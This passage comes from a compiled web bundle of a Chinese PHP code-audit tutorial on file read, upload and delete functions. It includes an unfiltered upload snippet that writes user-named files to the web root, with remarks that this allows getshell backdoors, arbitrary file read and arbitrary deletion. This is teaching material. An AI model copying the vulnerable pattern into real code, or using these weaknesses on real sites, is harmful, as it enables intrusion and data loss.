",Object(p.b)("inlineCode",{parentName:"p"},"@")," 来隐藏错误输出。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"fopen"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"filename",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"mode",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"include_path",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"context",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-16"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-16","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"filename：必需。要打开的文件或URL"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"mode：必需。规定访问类型（例如只读，只写，读写方式等，方式的规定和其他语言的规定方式一致）"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"include_path：可选。就是你可以指定搜索的路径位置，如果要指定的话，那么该参数要指定为1"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"context：可选。规定句柄的环境。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"fopen"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"demo.txt"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"rb"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$content")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"fread"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1024"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$content"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"fclose"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\nI am a demo text"))),Object(p.b)("p",null,"这段代码中其实也包含了",Object(p.b)("inlineCode",{parentName:"p"},"fread"),"的用法。因为",Object(p.b)("inlineCode",{parentName:"p"},"fread"),"仅仅只是打开一个文件，要想读取还得需要用到",Object(p.b)("inlineCode",{parentName:"p"},"fread"),"来读取文件内容。"),Object(p.b)("h3",{className:"__internal",id:"fread"},"fread()",Object(p.b)("a",c({parentName:"h3"},{href:"#fread","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数刚才在上个函数中基本已经演示过了，就是读取文件内容。这里代码就不再演示了，简单介绍一下参数和用法。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"string fread ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," resource ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$handle")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," int ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$length")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-17"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-17","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"handle：文件系统指针，是典型地由 ",Object(p.b)("inlineCode",{parentName:"li"},"fopen"),"创建的",Object(p.b)("inlineCode",{parentName:"li"},"resource"),"。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"length：必需。你要读取的最大字节数。")),Object(p.b)("h3",{className:"__internal",id:"fgets"},"fgets()",Object(p.b)("a",c({parentName:"h3"},{href:"#fgets","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"从打开的文件中读取一行"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"fgets"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"file",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"length",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," "))),Object(p.b)("h4",{className:"__internal",id:"参数-18"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-18","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"file：必需。规定要读取的文件。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"length：可选。规定要读取的字节数。默认是1024字节。")),Object(p.b)("p",null,"可以看出这个函数和之前的fread区别不是很大，只不过这个读取的是一行。"),Object(p.b)("h3",{className:"__internal",id:"fgetss"},"fgetss()",Object(p.b)("a",c({parentName:"h3"},{href:"#fgetss","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"fgetss"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"file",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"length",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"tags",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-19"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-19","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"file：必需。要检查的文件。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"length：可选。规定要读取的字节数，默认1024字节。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"tags：可选。哪些标记不去掉。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"fopen"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"demo.html"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"r"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"fgetss"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"fclose"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\ndemo.html代码\n",Object(p.b)("span",c({parentName:"code"},{className:"token tag"}),Object(p.b)("span",c({parentName:"span"},{className:"token tag"}),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"h1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),"I am a demo",Object(p.b)("span",c({parentName:"code"},{className:"token tag"}),Object(p.b)("span",c({parentName:"span"},{className:"token tag"}),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"h1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),"\n    \n执行结果——>\nI am a demo"))),Object(p.b)("h3",{className:"__internal",id:"readfile"},"readfile()",Object(p.b)("a",c({parentName:"h3"},{href:"#readfile","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数从名称基本就知道它是干啥的了，读文件用的。此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"readfile"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"filename",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"include_path",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"context",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-20"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-20","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"filename：必需。要读取的文件。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"include_path：可选。规定要搜索的路径。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"context：可选。规定文件句柄环境。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br>"')," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"readfile"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"demo.txt"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\nI am a demo:) I am a demo:(\n28"))),Object(p.b)("p",null,"我们看到不仅输出了所有内容，而且还输出了总共长度。但是没有输出换行。"),Object(p.b)("h3",{className:"__internal",id:"file"},"file()",Object(p.b)("a",c({parentName:"h3"},{href:"#file","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行，包括换行符。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"file"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"path",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"include_path",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"context",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-21"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-21","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"path：必需。要读取的文件。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"include_path：可选。可指定搜索路径。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"context：可选。设置句柄环境。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"demo.txt"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\nArray \n( \n[0] => I am the first line! \n[1] => I am the second line! \n)"))),Object(p.b)("h3",{className:"__internal",id:"parse_ini_file"},"parse_ini_file()",Object(p.b)("a",c({parentName:"h3"},{href:"#parse_ini_file","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"从名称可以看出，这个函数不是读取一个简单的文件。它的功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"parse_ini_file"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"file",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"process_sections",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-22"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-22","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"file：必需。要读取的ini文件"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"process_sections：可选。若为TRUE，则返回一个多维数组，包括了详细信息")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"parse_ini_file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"demo.ini"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),'\n\ndemo.ini内容：\n[names]\nme = Robert\nyou = Peter\n\n[urls]\nfirst = "http://www.example.com"\nsecond = "https://www.runoob.com"\n\n执行结果——>\nArray \n( \n[me] => Robert \n[you] => Peter \n[first] => http://www.example1.com \n[second] => https://www.example2.com \n)'))),Object(p.b)("h3",{className:"__internal",id:"show_sourcehighlight_file"},"show_source()/highlight_file()",Object(p.b)("a",c({parentName:"h3"},{href:"#show_sourcehighlight_file","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这两个函数没什么好说的，想必大家也经常见到这两个函数，其作用就是让php代码显示在页面上。这两个没有任何区别，",Object(p.b)("inlineCode",{parentName:"p"},"show_source"),"其实就是",Object(p.b)("inlineCode",{parentName:"p"},"highlight_file"),"的别名。"),Object(p.b)("h3",{className:"__internal",id:"总结-2"},"总结",Object(p.b)("a",c({parentName:"h3"},{href:"#%E6%80%BB%E7%BB%93-2","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"文件读取这块内容没什么好说的，不难，大多只是基本的应用。重点文件读取如果没有设置权限和过滤参数，那就问题大了，我们就可以任意文件读取了。"),Object(p.b)("p",null,"补充：什么是句柄？"),Object(p.b)("p",null,"开局先给一段代码"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"fopen"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"demo.txt"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"rb"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")))),Object(p.b)("p",null,"在这段代码中",Object(p.b)("inlineCode",{parentName:"p"},"$file"),"就是一个句柄。句柄关键点在“柄”，后面的",Object(p.b)("inlineCode",{parentName:"p"},"fopen"),"是一个资源，好比一口锅，而前面的",Object(p.b)("inlineCode",{parentName:"p"},"$file"),"就好比这个锅的把手。那么以后我们在操作的时候操作把手就行了。通过这个把手我们可以间接操作比较大的资源。其实也类似C语言中的指针，只是一个标识。"),Object(p.b)("h2",{className:"__internal",id:"文件上传"},"文件上传",Object(p.b)("a",c({parentName:"h2"},{href:"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"move_uploaded_file"},"move_uploaded_file()",Object(p.b)("a",c({parentName:"h3"},{href:"#move_uploaded_file","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数是将上传的文件移动到新位置。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"move_uploaded_file"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"file",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"newloc",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-23"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-23","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"file：必需。规定要移动的文件。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"newloc：必需。规定文件的新位置。")),Object(p.b)("p",null,"本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。"),Object(p.b)("p",null,"如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。"),Object(p.b)("p",null,"如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$fileName")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$_SERVER"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'DOCUMENT_ROOT'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'/uploads/'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$_FILES"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'file'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'name'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"move_uploaded_file"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$_FILES"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'file'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'tmp_name'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$fileName")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("p",null,"这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件。"),Object(p.b)("h2",{className:"__internal",id:"文件删除"},"文件删除",Object(p.b)("a",c({parentName:"h2"},{href:"#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"unlink"},"unlink()",Object(p.b)("a",c({parentName:"h3"},{href:"#unlink","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数用来删除文件。成功返回 TURE ，失败返回 FALSE。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"unlink"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"filename",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"context",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-24"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-24","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"filename：必需。要删除的文件。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"context：可选。句柄环境。")),Object(p.b)("p",null,"我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码）。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"demo.txt"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"unlink"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")),' have been deleted"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")),' not exist?"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\nphp",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"))))),Object(p.b)("h3",{className:"__internal",id:"session_destroy"},"session_destroy()",Object(p.b)("a",c({parentName:"h3"},{href:"#session_destroy","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"在了解这个函数之前，我们需要先了解 PHP session。 PHP session 变量用于存储关于用户会话的信息。关于 sesson 